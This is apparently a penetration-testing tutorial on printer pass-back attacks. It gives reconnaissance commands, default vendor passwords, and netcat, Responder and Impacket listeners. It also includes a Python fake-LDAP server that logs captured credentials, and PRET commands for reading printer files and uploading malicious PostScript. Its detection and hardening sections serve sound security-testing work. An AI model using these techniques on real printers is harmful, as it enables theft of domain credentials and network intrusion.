# Pass-Back Attacks

## Overview
Pass-Back Attacks target Multi-Function Printers (MFPs) and network printers to capture authentication credentials. These devices are often overlooked in penetration testing but can provide valuable access to domain credentials and network information.

## What are MFPs and Why Target Them?
- **Multi-Function Peripherals (MFPs)**: Devices that combine printing, scanning, copying, and faxing
- Often connected to corporate networks with high privileges
- Frequently store authentication credentials for various services
- Usually have weak default configurations
- Can access file shares, email servers, and LDAP directories
- Often overlooked in security assessments

## Pass-Back Attack Methodology

### 1. Discovery and Reconnaissance
```bash
# Nmap scan for common printer ports
nmap -p 9100,515,631,161 -sV target_network

# Specific printer service detection
nmap -p 9100 --script printer-info target_ip

# SNMP enumeration for printer information
snmpwalk -c public -v1 target_ip

# Check for web interfaces
nmap -p 80,443,8080,8443 --script http-title target_ip
```

### 2. Web Interface Access
```bash
# Common default credentials for printers
admin:admin
admin:password
admin:(blank)
root:root
service:service

# Check for embedded web servers
curl -I http://printer_ip
curl -I https://printer_ip
```

### 3. LDAP Configuration Exploitation

#### Accessing LDAP Settings
1. Navigate to printer's web interface
2. Look for "Network" or "Security" settings
3. Find "LDAP" or "Authentication" configuration
4. Common locations:
   - Network → Authentication
   - Security → LDAP Sign In Setup
   - Settings → Network Services

#### Replace LDAP Server
```bash
# Step 1: Note current LDAP server settings
# - Server Address (e.g., 192.168.1.100)
# - Port (usually 389 or 636)
# - Bind DN and credentials

# Step 2: Set up netcat listener on LDAP port
nc -lvp 389

# Step 3: Replace LDAP server with attacker IP
# Change LDAP Server Address to attacker IP
# Keep same port (389)
# Save configuration
```

### 4. Credential Capture
```bash
# Set up netcat listener
nc -lvp 389

# Alternative: Use custom LDAP server
# Install and configure OpenLDAP or use tools like:
# - Responder
# - Impacket's ntlmrelayx
# - Custom Python LDAP server

# Wait for user to authenticate (scan-to-email, etc.)
# Credentials will be sent to your server
```

## Tools and Techniques

### Essential Tools
- **PRET (Printer Exploitation Toolkit)**
- **Praeda** - Printer data extraction
- **Nmap** - Service discovery
- **Netcat** - Credential capture
- **Responder** - Network credential capture
- **Burp Suite** - Web interface testing

### PRET - Printer Exploitation Toolkit
```bash
# Installation
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
pip install colorama pysnmp

# Usage examples
python pret.py target_ip pjl        # PostScript/PCL
python pret.py target_ip ps         # PostScript
python pret.py target_ip pcl        # PCL

# Common PRET commands
ls                    # List files
get filename          # Download file
put filename          # Upload file
df                    # Show disk space
pwd                   # Current directory
cd directory          # Change directory
```

### Praeda - Printer Data Extraction
```bash
# Installation
git clone https://github.com/percx/Praeda.git
cd Praeda

# Scan for printers
perl praeda.pl -t target_ip

# Extract data from specific printer
perl praeda.pl -t target_ip -d
```

### Custom LDAP Server for Credential Capture
```python
#!/usr/bin/env python3
import socket
import threading

def handle_client(client_socket, address):
    print(f"[+] Connection from {address}")
    try:
        data = client_socket.recv(1024)
        print(f"[+] Received data: {data}")
        
        # Log credentials
        with open("captured_creds.txt", "a") as f:
            f.write(f"From {address}: {data}\n")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()

def start_ldap_server(port=389):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    
    print(f"[+] LDAP server listening on port {port}")
    
    while True:
        client, address = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client, address))
        client_thread.start()

if __name__ == "__main__":
    start_ldap_server()
```

## Attack Scenarios

### Scenario 1: Basic LDAP Credential Capture
```bash
# 1. Discover printer
nmap -p 80,443 192.168.1.0/24

# 2. Access web interface
# Navigate to http://printer_ip

# 3. Find LDAP settings
# Usually under Network → Security → LDAP

# 4. Set up listener
nc -lvp 389

# 5. Change LDAP server to attacker IP
# Save configuration

# 6. Wait for user to use scan-to-email or similar function
# Credentials will be captured
```

### Scenario 2: SMB Share Credential Harvesting
```bash
# 1. Access printer web interface
# 2. Navigate to scan-to-folder settings
# 3. Set up SMB share on attacker machine
# 4. Configure printer to use attacker's SMB share
# 5. Capture NTLM hashes when users scan documents

# Set up SMB server with Responder
responder -I eth0 -wrf

# Or use Impacket's smbserver
smbserver.py share /tmp -smb2support
```

### Scenario 3: Email Server Credential Capture
```bash
# 1. Access printer email settings
# 2. Configure SMTP server to attacker's server
# 3. Set up fake SMTP server
# 4. Capture credentials when users use scan-to-email

# Simple SMTP server for credential capture
python -m smtpd -n -c DebuggingServer localhost:25
```

## Advanced Techniques

### File System Access
```bash
# Using PRET to access printer file system
python pret.py target_ip pjl

# Common commands
ls /                  # List root directory
get /etc/passwd       # Try to get system files
put malicious.ps      # Upload malicious PostScript
```

### Memory Dump Analysis
```bash
# Dump printer memory using PRET
python pret.py target_ip pjl
nvram dump           # Dump non-volatile memory
```

### Firmware Analysis
```bash
# Download firmware if accessible
get firmware.bin

# Analyze with binwalk
binwalk firmware.bin
binwalk -e firmware.bin

# Look for hardcoded credentials, certificates, etc.
strings firmware.bin | grep -i password
strings firmware.bin | grep -i admin
```

## Common Printer Vulnerabilities

### Default Credentials
```
HP: admin/admin, admin/(blank)
Canon: admin/canon, root/admin
Xerox: admin/1111, admin/admin
Brother: admin/access, user/user
Ricoh: admin/admin, supervisor/supervisor
Kyocera: admin/admin, 2500/2500
```

### Common Ports and Services
```
Port 9100: Raw printing (JetDirect)
Port 515: Line Printer Daemon (LPD)
Port 631: Internet Printing Protocol (IPP)
Port 161: SNMP
Port 80/443: Web management interface
Port 21: FTP (some printers)
Port 23: Telnet (older printers)
```

### SNMP Information Gathering
```bash
# Get system information
snmpwalk -c public -v1 target_ip 1.3.6.1.2.1.1

# Get network interfaces
snmpwalk -c public -v1 target_ip 1.3.6.1.2.1.2.2.1.2

# Get printer-specific information
snmpwalk -c public -v1 target_ip 1.3.6.1.2.1.25.3.2.1.3
```

## Detection and Monitoring

### Network Monitoring
```bash
# Monitor for suspicious LDAP traffic
tcpdump -i eth0 port 389

# Monitor for printer communication
tcpdump -i eth0 port 9100 or port 515 or port 631

# Check for unusual SMB traffic
tcpdump -i eth0 port 445
```

### Log Analysis
```bash
# Check printer logs for configuration changes
# Look for:
# - LDAP server changes
# - New scan destinations
# - Unusual authentication attempts
# - Firmware updates
```

## Mitigation Strategies

### Network Security
```bash
# Segment printers on separate VLAN
# Implement access controls
# Monitor printer network traffic
# Regular firmware updates
# Disable unnecessary services
```

### Configuration Hardening
```
1. Change default credentials
2. Disable unnecessary protocols (Telnet, FTP)
3. Enable HTTPS only for web interface
4. Configure proper SNMP community strings
5. Implement authentication for all functions
6. Regular security audits
```

### Access Controls
```
- Implement user authentication for all functions
- Use domain authentication where possible
- Restrict administrative access
- Monitor and log all activities
- Regular access reviews
```

## Useful Resources and Tools

### GitHub Repositories
- [PRET - Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- [Praeda - Printer Data Extraction](https://github.com/percx/Praeda)
- [Printer Security Testing Cheat Sheet](http://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet)

### Documentation
- OWASP Printer Security Guide
- NIST Guidelines for Securing Network Printers
- Vendor-specific security guides

### Testing Checklist
```
□ Network discovery and port scanning
□ Default credential testing
□ Web interface security assessment
□ SNMP enumeration
□ File system access testing
□ Credential capture attempts
□ Firmware analysis (if possible)
□ Physical security assessment
□ Documentation review
□ Remediation recommendations
```

## Real-World Examples

### Case Study 1: Corporate Network Compromise
```
Target: Large corporation with HP MFPs
Method: LDAP server replacement
Result: Captured domain admin credentials
Impact: Full domain compromise
```

### Case Study 2: Healthcare Environment
```
Target: Hospital network with Canon printers
Method: SMB share credential harvesting
Result: Access to patient data systems
Impact: HIPAA violation, data breach
```

## Best Practices for Penetration Testers

### Pre-Engagement
1. Include printers in scope discussion
2. Understand printer network topology
3. Identify critical printing infrastructure
4. Plan for potential service disruption

### During Testing
1. Document all printer discoveries
2. Test during approved hours
3. Avoid disrupting critical operations
4. Capture evidence of vulnerabilities
5. Test various attack vectors

### Reporting
1. Clearly explain business impact
2. Provide step-by-step remediation
3. Include network diagrams
4. Recommend security controls
5. Suggest monitoring improvements

---

**Note**: Always ensure proper authorization before testing printer security. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 